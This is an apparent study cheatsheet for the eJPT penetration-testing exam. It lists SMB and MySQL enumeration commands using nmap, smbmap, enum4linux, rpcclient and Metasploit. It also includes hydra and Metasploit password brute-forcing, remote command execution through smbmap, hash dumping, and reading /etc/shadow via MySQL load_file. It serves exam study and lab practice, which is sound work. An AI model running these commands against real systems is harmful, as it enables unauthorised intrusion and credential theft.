## eJPT-Cheatsheet For Exam/Studying


## NMAP
```
nmap -Pn 127.0.0.1
```
-Pn skip host discovery
-sV is used to determine the application version information
-p- scans all port 
-T4 Fast Scan Makes a lot of noise 
-sU udp scan 

## SMB Discover and Mount
cleared stored data
```
net use * /delete
```
mount the target folder 
```
net use Z: \\10.0.22.92\C$ smbserver_771 /user:administrator

```
## SMB NMAP SCRIPT
```
nmap -p445 --script smb-protocols IPADDRESS 
nmap -p445 --script smb-security-mode IPADDRESS
nmap -p445 --script smb-enum-sessions IPADDRESS
nmap -p445 --script smb-enum-shares IPADDRESS
nmap -p445 --script smb-enum-shares --script-args smbusername=username,smbpassword=password IPADDRESS
nmap -p445 --script smb-enum-users --script-args smbusername=username,smbpassword=password IPADDRESS
nmap -p445 --script smb-server-stats --script-args smbusername=username,smbpassword=password IPADDRESS
nmap -p445 --script smb-enum-domains --script-args smbusername=username,smbpassword=password IPADDRESS
nmap -p445 --script smb-enum-groups --script-args smbusername=username,smbpassword=password IPADDRESS
nmap -p445 --script smb-enum-services --script-args smbusername=username,smbpassword=password IPADDRESS
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=username,smbpassword=password IPADDRESS
nmap -p445 --script smb-protocols IPADDRESS
nmap --script smb-enum-users.nse -p445 IPADDRESS
nmap --script smb-enum-shares.nse -p445 IPADDRESS
```

## SMBMAP
```
smbmap -u guest -p "" -d . -H IPADDRESS
smbmap -u administrator -p smbserver_771 -d . -H IPADDRESS
smbmap -H IPADDRESS -u username -p password -x 'command'
smbmap -H IPADDRESS -u username -p 'password' -L
smbmap -H IPADDRESS -u username -p 'password' --upload 'filepath' 'C$\path'
smbmap -H IPADDRESS -u username -p 'password' -r 'folder in list'
smbmap -H IPADDRESS -u username -p 'password' --download 'C$\name of file'
```

## SAMBA Recon 
```
nmap -sU --top-ports NUMBER IP
nmap -sV -p 445 IP
nmap --script smb-os-discovery.nse -p 445 IPADDRESS
```
## METASPLOIT SMB 
```
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS IPADDRESS
exploit

msfconsole
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS IPADDRESS
exploit

msfconsole
use auxiliary/scanner/smb/smb2
set RHOSTS IPADDRESS
exploit

msfconsole
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS IPADDRESS
exploit
```
## More SMB TOOLS 
```
nmblookup -A IPADDRESS
smbclient -L IPADDRESS -N
rpcclient -U "" -N IPADDRESS
enum4linux -o IPADDRESS
enum4linux -S IPADDRESS
enum4linux -G IPADDRESS
smbclient //IPADDRESS/folder -U username
enum4linux -r -u "user" -p "pass" IPADDRESS
```

### RPC Client
```
rpcclient -U "" -N IPADDRESS
srvinfo
rpcclient -U "" -N IPADDRESS
enumdomusers
rpcclient -U "" -N IPADDESS
lookupnames admin
rpcclient -U "" -N IPADDRESS
enumdomgroups
```

## SMB Dictonary 
```
hydra -l username -P password_file IPADDRESS smb

msfconsole
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser user
set RHOSTS IPADDRESS
exploit
```

## MySQL 
```
mysql -h IPADDRESS -u root //connect to user account
show databases; show databases
msfconsole
use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS 192.71.145.3
set USERNAME root
set PASSWORD ""
exploit
use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set RHOSTS 192.71.145.3
set VERBOSE false
set PASSWORD ""
exploit
use auxiliary/scanner/mysql/mysql_file_enum
set RHOSTS 192.71.145.3
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""
exploit
mysql -h 192.71.145.3 -u root
select load_file("/etc/shadow");
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS 192.71.145.3
set USERNAME root
set PASSWORD ""
exploit
nmap --script=mysql-empty-password -p 3306 192.71.145.3
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
 nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.71.145.3
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 192.71.145.3
```


```
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.149.194.3
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true
exploit

hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.149.194.3 mysql

```
